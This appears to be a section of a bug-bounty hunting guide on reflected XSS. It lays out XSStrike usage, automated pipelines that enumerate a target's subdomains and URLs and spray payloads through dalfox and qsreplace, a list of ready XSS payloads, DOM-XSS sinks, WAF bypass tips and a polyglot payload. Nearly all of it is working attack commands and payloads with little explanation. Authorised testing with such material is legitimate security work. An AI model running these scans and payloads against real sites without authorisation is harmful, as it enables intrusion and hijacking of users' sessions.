# 17. RXSS — Reflected XSS Hunting Workflow

## XSStrike — primary tool

```
https://github.com/s0md3v/XSStrike
```

```bash
# Crawl the entire site for reflected XSS
python xsstrike.py -u "https://target.com" --crawl

# Single URL with parameters
python xsstrike.py -u "https://target.com/search?q=test"

# POST data
python xsstrike.py -u "https://target.com/login" --data "user=admin&pass=test"
```

## Manual recon → automation pipeline

### One-liner: subdomain → live → URLs → XSS

```bash
subfinder -d target.com -silent | httpx -silent | katana -silent | grep "=" \
  | qsreplace '"><svg/onload=confirm(1)>' \
  | freq

subfinder -d target.com -silent | httpx -silent \
  | gau --threads 5 \
  | gxss -p khXSS -o output.txt \
  | dalfox file output.txt
```

### Wayback + qsreplace + freq

```bash
echo "target.com" | waybackurls | grep "=" | qsreplace -a \
  | tee urls.txt

# Use freq to detect XSS context based on response variance
cat urls.txt | freq

# Or pipe directly to dalfox
cat urls.txt | dalfox pipe
```

### gxss + dalfox combo

```bash
echo "target.com" | gau \
  | grep "=" \
  | qsreplace -a \
  | gxss -p eXcSr \
  | dalfox pipe
```

## Tooling list

```
subfinder    -> subdomain enumeration
httprobe     -> live host discovery (alt: httpx)
qsreplace    -> replace each query-string parameter with a payload
gau          -> get all URLs from Wayback / OTX / Common Crawl
waybackurls  -> get all URLs from the Wayback Machine
gxss         -> reflection scanner
dalfox       -> XSS scanner / parameter analyser
kxss         -> reflection finder
freq         -> reflection / DOM-based response variance detector
```

## Payload set for manual testing

```html
<script>alert(1)</script>
"><svg/onload=confirm(1)>
"><img src=x onerror=alert(1)>
'-alert(1)-'
javascript:alert(1)
"><iframe src="javascript:alert(1)"></iframe>
"><body onload=alert(1)>
"><details open ontoggle=alert(1)>
"><marquee onstart=alert(1)>
"><a href=javascript:alert(1)>click</a>
```

## DOM-XSS hotspots

- `location.hash`, `location.search`, `location.pathname` flowing into `innerHTML`, `document.write`, `eval`, `setTimeout`.
- `postMessage` handlers without origin checks.
- `URL.createObjectURL`, `Blob` constructors.
- jQuery `$(location.hash)`.

## Filter / WAF bypass tips

- Mix case: `<ScRiPt>`
- Use HTML entity encoding: `&#x3c;script&#x3e;`
- Use Unicode normalization tricks
- Use exotic event handlers (e.g. `onpointerover`, `onanimationend`, `onslotchange`)
- Avoid `<script>` and use `<svg>`, `<math>`, `<details>`, `<marquee>`
- Break out of attribute context with `"` `'` `>` `<` `/`

## Polyglot

```
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```
